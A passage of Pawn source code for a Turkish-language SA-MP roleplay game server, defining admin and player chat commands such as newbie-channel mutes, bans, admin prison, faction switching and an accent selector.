			format(string, sizeof(string), "** Level 1 Admin %s: %s", GetPlayerNameEx(playerid), params);
		else if(PlayerInfo[playerid][pAdmin] == 2)
			format(string, sizeof(string), "** Level 2 Admin %s: %s", GetPlayerNameEx(playerid), params);
		else if(PlayerInfo[playerid][pAdmin] == 3)
			format(string, sizeof(string), "** Level 3 Admin %s: %s", GetPlayerNameEx(playerid), params);
	    else if(PlayerInfo[playerid][pAdmin] == 4)
			format(string, sizeof(string), "** Level 4 Admin %s: %s", GetPlayerNameEx(playerid), params);
	    else if(PlayerInfo[playerid][pAdmin] == 5)
			format(string, sizeof(string), "** Level 5 Admin %s: %s", GetPlayerNameEx(playerid), params);
	    else if(PlayerInfo[playerid][pAdmin] == 6)
			format(string, sizeof(string), "** Level 6 Admin %s: %s", GetPlayerNameEx(playerid), params);
	    else if(PlayerInfo[playerid][pAdmin] == 7)
			format(string, sizeof(string), "** Level 7 Admin %s: %s", GetPlayerNameEx(playerid), params);
	    else if(PlayerInfo[playerid][pAdmin] == 8)
			format(string, sizeof(string), "** Level 8 Admin %s: %s", GetPlayerNameEx(playerid), params);
	    else if(PlayerInfo[playerid][pAdmin] == 9)
			format(string, sizeof(string), "** Level 9 Admin %s: %s", GetPlayerNameEx(playerid), params);
	    else if(PlayerInfo[playerid][pAdmin] == 10)
			format(string, sizeof(string), "** Server Owner %s: %s", GetPlayerNameEx(playerid), params);			
 	}
	else if(AdminDuty[playerid] == 0)
	{
		if(PlayerInfo[playerid][pHelper] == 1)
			format(string, sizeof(string), "** Stajyer Helper %s: %s", GetPlayerNameEx(playerid), params);
	 	else if(PlayerInfo[playerid][pHelper] == 2)
			format(string, sizeof(string), "** Level 1 Helper %s: %s", GetPlayerNameEx(playerid), params);
		else if(PlayerInfo[playerid][pHelper] == 3)
			format(string, sizeof(string), "** Level 2 Helper %s: %s", GetPlayerNameEx(playerid), params);
		else if(PlayerInfo[playerid][pHelper] == 4)
			format(string, sizeof(string), "** Level 3 Helper %s: %s", GetPlayerNameEx(playerid), params);
		else if(PlayerInfo[playerid][pHelper] == 5)
			format(string, sizeof(string), "** Level 4 Helper %s: %s", GetPlayerNameEx(playerid), params);
		else if(PlayerInfo[playerid][pHelper] == 6)
			format(string, sizeof(string), "** Level 5 Helper %s: %s", GetPlayerNameEx(playerid), params);		
		else if(PlayerInfo[playerid][pAdmin] < 1)
			format(string, sizeof(string), "** Oyuncu %s: %s", GetPlayerNameEx(playerid), params);
		else if(PlayerInfo[playerid][pAdmin] == 1)
			format(string, sizeof(string), "** Oyuncu %s: %s", GetPlayerNameEx(playerid), params);
		else if(PlayerInfo[playerid][pAdmin] == 2)
			format(string, sizeof(string), "** Oyuncu %s: %s", GetPlayerNameEx(playerid), params);
		else if(PlayerInfo[playerid][pAdmin] == 3)
			format(string, sizeof(string), "** Oyuncu %s: %s", GetPlayerNameEx(playerid), params);
	    else if(PlayerInfo[playerid][pAdmin] == 4)
			format(string, sizeof(string), "** Oyuncu %s: %s", GetPlayerNameEx(playerid), params);
	    else if(PlayerInfo[playerid][pAdmin] == 5)
			format(string, sizeof(string), "** Oyuncu %s: %s", GetPlayerNameEx(playerid), params);
	    else if(PlayerInfo[playerid][pAdmin] == 6)
			format(string, sizeof(string), "** Oyuncu %s: %s", GetPlayerNameEx(playerid), params);
	    else if(PlayerInfo[playerid][pAdmin] == 7)
			format(string, sizeof(string), "** Oyuncu %s: %s", GetPlayerNameEx(playerid), params);
	    else if(PlayerInfo[playerid][pAdmin] == 8)
			format(string, sizeof(string), "** Oyuncu %s: %s", GetPlayerNameEx(playerid), params);
	    else if(PlayerInfo[playerid][pAdmin] == 9)
			format(string, sizeof(string), "** Oyuncu %s: %s", GetPlayerNameEx(playerid), params);
	    else if(PlayerInfo[playerid][pAdmin] == 10)
			format(string, sizeof(string), "** Oyuncu %s: %s", GetPlayerNameEx(playerid), params);			
	}

	foreach(Player, n) {
		if(gNewbie[n] == 0)
			SendClientMessageEx(n, COLOR_NEWBIE, string);
	}
	return 1;
}

CMD:nonewbie(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 3) {
		if(!nonewbie) {
			nonewbie = 1;
			SendClientMessageToAllEx(COLOR_GRAD2, "Newbie Sohbet Kanalý bir Admin tarafýndan kapatýldý!");
		}
		else {
			nonewbie = 0;
			SendClientMessageToAllEx(COLOR_GRAD2, "Newbie Sohbet Kanalý bir Admin tarafýndan açýldý!");
		}
	}
	else return	SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	return 1;
}

CMD:nmute(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 2) {
		new
			string[128],
			giveplayerid;

		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /nmute [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid)) {
			if(PlayerInfo[giveplayerid][pAdmin] >= 1)
				return SendClientMessage(playerid, COLOR_LIGHTRED, "Adminleri /nmute yapamazsýn.");

			if(PlayerInfo[giveplayerid][pNMute] == 0) {
				PlayerInfo[giveplayerid][pNMute] = 1;
				PlayerInfo[giveplayerid][pNMuteTotal] += 1;
				format(string, sizeof(string), "AdminKomutu: %s, /newb kanalýndan %s tarafýndan mutelendi.", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
				ABroadCast(COLOR_LIGHTRED,string,1);
				Log("logs/admin.log", string);

				if(PlayerInfo[giveplayerid][pNMuteTotal] > 6) {
					new playerip[32];
					GetPlayerIp(giveplayerid, playerip, sizeof(playerip));
					format(string, sizeof(string), "AdminKomutu: %s(IP:%s), %s tarafýndan banlandý, sebep: Aþýrý newbie sohbet mutesi", GetPlayerNameEx(giveplayerid),playerip,GetPlayerNameEx(playerid));
					Log("logs/ban.log", string);
					format(string, sizeof(string), "AdminKomutu: %s banlandý, sebep: Aþýrý newbie sohbet mutesi.", GetPlayerNameEx(giveplayerid));
					SendClientMessageToAllEx(COLOR_LIGHTRED, string);
					PlayerInfo[giveplayerid][pBanned] = 1;
					new ip[32];
					GetPlayerIp(giveplayerid,ip,sizeof(ip));
					AddBan(ip);
					Kick(giveplayerid);
				}

				SendClientMessage(giveplayerid, COLOR_WHITE, "Unutma, Newbie Sohbet Kanalý sadece senaryo/sunucu ile alakalý sorular içindir ve baþka hiçbir amaç için kullanýlamaz, (eðer baþka bir Admin tarafýndan durum deðiþtirilmediyse).");
				SendClientMessage(giveplayerid, COLOR_WHITE, "Mutenin açýlmasýný istiyorsan, Ya para ya hapis cezasý alacaksýn. Ilerideki kötüye kullanmalar ceza miktarýný arttýrýr. Bunun bir hata olduðunu düþünüyorsan, Level 4+ Admin ile baðlantýya geç.");

				foreach(Player, i)
				{
					if(PlayerInfo[i][pAdmin] == 0)
					{
						format(string, sizeof(string), "AdminKomutu: %s, Newbie Kanalýndan [/newb] kötüye kullanmaktan mutelendi.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(i, COLOR_LIGHTRED, string);
					}
				}
			}
			else {
				ShowNMuteFine(giveplayerid);
				format(string, sizeof(string), "%s adlý kiþiye /newb için mute kaldýrmayý önerdin.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTRED, string);
			}
		}
	}
	else return SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	return 1;
}

CMD:nunmute(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /nunmute [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pNMute] == 1)
			{
				format(string, sizeof(string), "AdminKomutu: %s, /newb kanalýndan %s tarafýndan mutesi kaldýrýldý.", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
				ABroadCast(COLOR_LIGHTRED,string,1);
				Log("logs/admin.log", string);
				PlayerInfo[giveplayerid][pNMute] = 0;
				PlayerInfo[giveplayerid][pNMuteTotal]--;
			}
			else
			{
				SendClientMessage(playerid, COLOR_LIGHTRED,"Oyuncu Newbie Kanalýndan mutelenmemiþ!");
			}

		}
	}
	return 1;
}

CMD:admute(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /admute [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid))
		{
				if(PlayerInfo[giveplayerid][pAdmin] >= 1)
				{
					return SendClientMessage(playerid, COLOR_LIGHTRED, "Adminleri /admute yapamazsýn!");
				}
				if(PlayerInfo[giveplayerid][pADMute] == 0)
				{
					PlayerInfo[giveplayerid][pADMute] = 1;
					PlayerInfo[giveplayerid][pADMuteTotal] += 1;
	    			szAdvert[giveplayerid][0] = 0;
					format(string, sizeof(string), "AdminKomutu: %s, /reklamlar 'dan dolayý %s tarafýndan mutelendi.", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
					Log("logs/admin.log", string);
					ABroadCast(COLOR_LIGHTRED,string,1);

					if(PlayerInfo[giveplayerid][pADMuteTotal] > 6)
					{
						new playerip[32];
						GetPlayerIp(giveplayerid, playerip, sizeof(playerip));
						format(string, sizeof(string), "AdminKomutu: %s(IP:%s), %s tarafýndan banlandý, sebep: Aþýrý reklam mutesi", GetPlayerNameEx(giveplayerid),playerip,GetPlayerNameEx(playerid));
						Log("logs/ban.log", string);
						format(string, sizeof(string), "AdminKomutu: %s banlandý, sebep: Aþýrý reklam mutesi.", GetPlayerNameEx(giveplayerid));
						SendClientMessageToAllEx(COLOR_LIGHTRED, string);
						PlayerInfo[giveplayerid][pBanned] = 1;
						new ip[32];
						GetPlayerIp(giveplayerid,ip,sizeof(ip));
						AddBan(ip);
						Kick(giveplayerid);
					}

					SendClientMessage(giveplayerid, COLOR_LIGHTRED, "Unutma, Reklamlar sadece IC amaçlar için kullanýlabilir ve baþka hiçbir amaç için kullanýlamaz(eðer admin tarafýndan durum deðiþtirilmediyse).");
					SendClientMessage(giveplayerid, COLOR_LIGHTRED, "Mutenin açýlmasýný istiyorsan, Ya para ya hapis cezasý alacaksýn. Ilerideki kötüye kullanmalar ceza miktarýný arttýrýr. Bunun bir hata olduðunu düþünüyorsan, Level 4+ Admin ile baðlantýya geç.");

					format(string, sizeof(string), "AdminKomutu: %s, [/reklamlar] Reklamý kötüye kullanmaktan mutelendi.", GetPlayerNameEx(giveplayerid));
					SendClientMessageToAllEx(COLOR_LIGHTRED, string);
				}
				else
				{
					ShowAdMuteFine(giveplayerid);
					format(string, sizeof(string), "%s adlý kiþiye /reklamlar mutesini kaldýrmayý teklif ettin.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTRED, string);
				}

		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:adunmute(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128], giveplayerid;

		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /adunmute [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pADMute] == 1)
			{
				if(PlayerInfo[giveplayerid][pJailed] != 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTRED, "Hapisteki birine mute kaldýrmayý öneremezsin!");
					SendClientMessage(giveplayerid, COLOR_LIGHTRED, "Üzgünüz, Hapisteyken /reklamlar muten kaldýrýlamaz.");
					return 1;
				}
				format(string, sizeof(string), "AdminKomutu: %s adlý kiþinin /reklamlar mutesi %s tarafýndan kaldýrýldý.", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
				ABroadCast(COLOR_LIGHTRED,string,1);
				Log("logs/admin.log", string);
				PlayerInfo[giveplayerid][pADMute] = 0;
				PlayerInfo[giveplayerid][pADMuteTotal]--;
			}
			else
			{
				SendClientMessage(playerid, COLOR_LIGHTRED,"Oyuncu Newbie Kanalýndan mutelenmemiþ!");
			}

		}
	}
	return 1;
}

CMD:setname(playerid, params[]) {
	new
		szQuery[128],
		iTarget,
		szNewName[MAX_PLAYER_NAME];

	if(sscanf(params, "us[24]", iTarget, szNewName))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /setname [Oyuncu ID/Ýsim] [newname]");

	if(iTarget == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");

	if(PlayerInfo[playerid][pAdmin] < 4)
	    return SendClientMessage(playerid, COLOR_GREY, "Yetersiz Admin leveli.");

 	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

	if(AdminDuty[iTarget] == 1)
 		return SendClientMessage(playerid,COLOR_WHITE, "Iþbaþýndaki bir admin üzerinde /setname komutunu kullanamazsýn.");

	if(strfind(szNewName, "_", false) == -1)
		return SendClientMessage(playerid, COLOR_GREY, "Isim alttan çizgi ('_') içermeli.");

	mysql_real_escape_string(szNewName, szNewName, g_MySQLConnections[0]);

	SetPVarInt(iTarget, "requestby", playerid);
	SetPVarInt(iTarget, "requestpath", 3);
	SetPVarString(iTarget, "requestedname", szNewName);

	format(szQuery, sizeof(szQuery), "SELECT Username FROM players WHERE Username = '%s'", szNewName);
	mysql_query(szQuery, THREAD_CHECK_NEW_NAME, iTarget, g_MySQLConnections[0]);

	return 1;
}

CMD:sprison(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		new string[128], giveplayerid, minutes, reason[64];
		if(sscanf(params, "uds[64]", giveplayerid, minutes, reason)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /sprison [Oyuncu ID/Ýsim] [dakika] [sebep]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pAdmin] >= PlayerInfo[playerid][pAdmin] && AdminDuty[giveplayerid] == 1)
			{
				SendClientMessage(playerid, COLOR_WHITE, "Bu komutu sana eþit veya daha yüksek leveldeki admin  üzerinde uygulayamazsýn.");
				return 1;
			}

			if(strlen(reason) >= 25)
			{
				SendClientMessage(playerid, COLOR_WHITE, "Daha kýsa bir sebep yaz. Hapis sebebi maksimum 25 karakter.");
				return 1;
			}
			if(PlayerDraggedBy[giveplayerid] != INVALID_PLAYER_ID) {
				IsCopDragging[PlayerDraggedBy[giveplayerid]] = INVALID_PLAYER_ID;
				PlayerDragged[giveplayerid] = 0;
				PlayerDraggedBy[giveplayerid] = INVALID_PLAYER_ID;
			}
			if(IsPlayerAttachedObjectSlotUsed(giveplayerid, 0))
				RemovePlayerAttachedObject(giveplayerid, 0);
			GameTextForPlayer(giveplayerid, "~w~Hoþgeldiniz ~n~~r~Admin Hapishanesi", 5000, 3);
			ResetPlayerWeaponsEx(giveplayerid);
			format(string, sizeof(string), "AdminKomutu: %s, %s tarafýndan sessiz hapse atýldý, sebep: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
			Log("logs/admin.log", string);
			format(string, sizeof(string), "AdminKomutu: %s, Admin tarafýndan hapse atýldý, sebep: %s", GetPlayerNameEx(giveplayerid), reason);
			SendClientMessageToAllEx(COLOR_LIGHTRED, string);
			PlayerInfo[giveplayerid][pWantedLevel] = 0;
			SetPlayerWantedLevel(giveplayerid, 0);
			PlayerInfo[giveplayerid][pJailed] = 3;
			PlayerInfo[giveplayerid][pJailTime] = minutes*60;
			format(PlayerInfo[giveplayerid][pPrisonReason], 128, "%s", reason);
			format(PlayerInfo[giveplayerid][pPrisonedBy], MAX_PLAYER_NAME, "%s", GetPlayerNameEx(playerid));
			PhoneOnline[giveplayerid] = 1;

		    LoadObjectsForPlayer(giveplayerid);

			SetPlayerInterior(giveplayerid, 69);
			PlayerInfo[giveplayerid][pVW] = 696969;
			PlayerInfo[giveplayerid][pInt] = 69;
			SetPlayerVirtualWorld(giveplayerid, 696969);
			new rand = random(sizeof(AdminPrisonFloat));
			SetPlayerPos(giveplayerid, AdminPrisonFloat[rand][0], AdminPrisonFloat[rand][1], AdminPrisonFloat[rand][2]);

			SetPlayerSkin(giveplayerid, 50);
			SetPlayerColor(giveplayerid, TEAM_APRISON_COLOR);
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:switchfac(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
  		{
   			SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
		}
		new string[128], factionid;
		if(sscanf(params, "d", factionid))
		{
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /switchfac [factionid]");
			SendClientMessage(playerid, COLOR_GRAD3, "|1 LSPD |2 FBI |3 LSFMD |4 Disabled |5 Devlet |6 LST |9 SA Haberleri");
			return 1;
		}

		switch(factionid) {
			case 1: {
				format(string, sizeof(string), "Kuruluþ ID %d (LSPD) tarafýna geçtin.", factionid);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pFaction] = factionid;
				PlayerInfo[playerid][pRank] = 6;
				PlayerInfo[playerid][pGang] = 255;
			}
			case 2: {
				format(string, sizeof(string), "Kuruluþ ID %d (FBI) tarafýna geçtin.", factionid);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pFaction] = factionid;
				PlayerInfo[playerid][pRank] = 6;
				PlayerInfo[playerid][pGang] = 255;
			}
			case 3:	{
				format(string, sizeof(string), "Kuruluþ ID %d (LSFMD) tarafýna geçtin.", factionid);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pFaction] = factionid;
				PlayerInfo[playerid][pRank] = 6;
				PlayerInfo[playerid][pGang] = 255;
			}
			case 4: {
				SendClientMessage(playerid, COLOR_LIGHTBLUE, " /switchfac Hitman Ajansýna /switchfac ile geçemezsin.");
			}
			case 5: {
				format(string, sizeof(string), "Kuruluþ ID %d (Devlet) tarafýna geçtin.", factionid);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pFaction] = factionid;
				PlayerInfo[playerid][pRank] = 6;
				PlayerInfo[playerid][pGang] = 255;
			}
			case 6: {
				format(string, sizeof(string), "Kuruluþ ID %d (LST) tarafýna geçtin.", factionid);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pFaction] = factionid;
				PlayerInfo[playerid][pRank] = 6;
				PlayerInfo[playerid][pGang] = 255;
			}
			case 9: {
				format(string, sizeof(string), "Kuruluþ ID %d (SA Haberleri) tarafýna geçtin.", factionid);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pFaction] = factionid;
				PlayerInfo[playerid][pRank] = 6;
				PlayerInfo[playerid][pGang] = 255;
			}
			default: {
				SendClientMessage(playerid, COLOR_WHITE, "Geçersiz Kuruluþ ID!");
				SendClientMessage(playerid, COLOR_GRAD3, "|1 LSPD |2 FBI |3 LSFMD |4 Disabled |5 Devlet |6 LST |9 SA Haberleri");
			}
		}
	}
	return 1;
}

CMD:switchfam(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128], familyid;
		if(sscanf(params, "d", familyid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /switchfam [familyid]");

		if(familyid < 1 || familyid > 14) return SendClientMessage(playerid, COLOR_WHITE, "Geçersiz Aile Numarasý.");
		format(string, sizeof(string), "Aile ID %d (%s) tarafýna geçtin.", familyid, FamilyInfo[familyid-1][FamilyName]);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		PlayerInfo[playerid][pRank] = 6;
		PlayerInfo[playerid][pGang] = familyid-1;
		PlayerInfo[playerid][pFaction] = 0;
		PlayerInfo[playerid][pLeader] = 0;
	}
	return 1;
}

CMD:clearall(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
  		{
   			SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
		}
        foreach(Player, i) {
            PlayerInfo[i][pWantedLevel] = 0;
            SetPlayerToTeamColor(i);
            SetPlayerWantedLevel(i, 0);
            ClearCrime(i);
        }
        SendClientMessage(playerid,COLOR_GRAD1, "Herkesin Aranma Level'ini temizledin.");
    }
    else {
        SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
    }
    return 1;
}

CMD:permaban(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 5)
	{
		new string[128], giveplayerid, reason[64];
		if(sscanf(params, "us[64]", giveplayerid, reason))
		{
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /permaban [Oyuncu ID/Ýsim] [sebep]");
			return 1;
		}
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pAdmin] > PlayerInfo[playerid][pAdmin])
			{
				if(AdminDuty[playerid] == 1)
				{
					new username[MAX_PLAYER_NAME];
					GetPVarString(playerid, "TempNameName", username, sizeof(username));
					SetPVarInt(playerid, "TempName", 0);
					SetPlayerName(playerid, username);
				}
				format(string, sizeof(string), "AdminKomutu: %s otomatik banlandý, sebep: /permaban ile daha yüksek bir admini banlamaya çalýþmak.", PlayerInfo[playerid][pAdminName]);
				ABroadCast(COLOR_YELLOW,string,1);
				PlayerInfo[playerid][pBanned] = 3;
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
			}
			else
			{
				new playerip[32];
				GetPlayerIp(giveplayerid, playerip, sizeof(playerip));

				if(AdminDuty[giveplayerid] == 1)
				{
					new username[MAX_PLAYER_NAME];
					GetPVarString(giveplayerid, "TempNameName", username, sizeof(username));
					SetPVarInt(giveplayerid, "TempName", 0);
					SetPlayerName(giveplayerid, username);

					format(string, sizeof(string), "AdminKomutu: %s(IP:%s), %s tarafýndan kalýcý olarak banlandý, sebep: %s", PlayerInfo[giveplayerid][pAdminName], playerip, GetPlayerNameEx(playerid), reason);
					Log("logs/ban.log", string);
					format(string, sizeof(string), "AdminKomutu: %s, %s tarafýndan kalýcý olarak banlandý, sebep: %s", PlayerInfo[giveplayerid][pAdminName], GetPlayerNameEx(playerid), reason);
				}
				else
				{
					format(string, sizeof(string), "AdminKomutu: %s(IP:%s), %s tarafýndan kalýcý olarak banlandý, sebep: %s", GetPlayerNameEx(giveplayerid), playerip, GetPlayerNameEx(playerid), reason);
					Log("logs/ban.log", string);
					format(string, sizeof(string), "AdminKomutu: %s, %s tarafýndan kalýcý olarak banlandý, sebep: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
				}

				SendClientMessageToAllEx(COLOR_LIGHTRED, string);
				PlayerInfo[giveplayerid][pPermaBanned] = 1;
				new ip[32];
				GetPlayerIp(giveplayerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(giveplayerid);
			}
			return 1;
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	return 1;
}

CMD:setcolor(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 1)
	{
        ShowPlayerDialogEx(playerid, COLORMENU, DIALOG_STYLE_LIST, "Renk Menüsü", "Mavi\nSiyah\nKýrmýzý\nTuruncu\nPembe\nMor\nYeþil\nSarý\nBeyaz", "Seç", "Iptal");
    }
    else
	{
        SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
    }
    return 1;
}

CMD:aksan(playerid, params[])
{
	new accent;
	if(sscanf(params, "d", accent))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /aksan [accent ID]");
		SendClientMessage(playerid, COLOR_GRAD2, "Kullanýlabilir Isimler: Normal [1], Ingiliz [2], Asyalý [3], Iskoç [4], Irlandalý [5], Rus [6], Amerikan [7]");
		SendClientMessage(playerid, COLOR_GRAD2, "Kullanýlabilir Aksanlar: Ispanyol [8], Güney [9], Kübalý [10], Italyan [11], Gangster [12], Avustralyalý [13]");
		SendClientMessage(playerid, COLOR_GRAD2, "Kullanýlabilir Aksanlar: Arap [14], Balkan [15], Kanadalý [16], Jamaikalý [17], Israilli [18], Hindu [19]");
        SendClientMessage(playerid, COLOR_GRAD2, "Kullanýlabilir Aksanlar: Galler [20], Fransýz [21], Alman [22], Hollandalý [23], Güney Afrikalý [24], Aksan Yok [25]");
		return 1;
	}

	switch(accent)
	{
	case 1:
		{
			PlayerInfo[playerid][pAccent] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Normal aksan ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
	case 2:
		{
			PlayerInfo[playerid][pAccent] = 2;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Ingiliz aksaný ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
	case 3:
		{
			PlayerInfo[playerid][pAccent] = 3;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Asyalý aksaný ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
	case 4:
		{
			PlayerInfo[playerid][pAccent] = 4;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Iskoç aksaný ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
	case 5:
		{
			PlayerInfo[playerid][pAccent] = 5;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Irlandalý aksaný ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
	case 6:
		{
			PlayerInfo[playerid][pAccent] = 6;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Rus aksaný ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
	case 7:
		{
			PlayerInfo[playerid][pAccent] = 7;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Amerikan aksaný ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
	case 8:
		{
			PlayerInfo[playerid][pAccent] = 8;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Ispanyol aksaný ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
	case 9:
		{
			PlayerInfo[playerid][pAccent] = 9;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Güney aksaný ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
	case 10:
		{
			PlayerInfo[playerid][pAccent] = 10;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Kübalý aksaný ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
	case 11:
		{
			PlayerInfo[playerid][pAccent] = 11;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Italyan aksaný ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
	case 12:
		{
			PlayerInfo[playerid][pAccent] = 12;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Gangster aksaný ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
	case 13:
		{
			PlayerInfo[playerid][pAccent] = 13;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Avustralyalý aksaný ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
	case 14:
		{
			PlayerInfo[playerid][pAccent] = 14;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Arap aksaný ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
	case 15:
		{
			PlayerInfo[playerid][pAccent] = 15;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Balkan aksaný ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
	case 16:
		{
			PlayerInfo[playerid][pAccent] = 16;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Kanadalý aksaný ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
	case 17:
		{
			PlayerInfo[playerid][pAccent] = 17;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Jamaikalý aksaný ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
	case 18:
		{
			PlayerInfo[playerid][pAccent] = 18;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Israilli aksaný ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
 	case 19:
		{
			PlayerInfo[playerid][pAccent] = 19;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Hindu aksaný ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
 	case 20:
		{
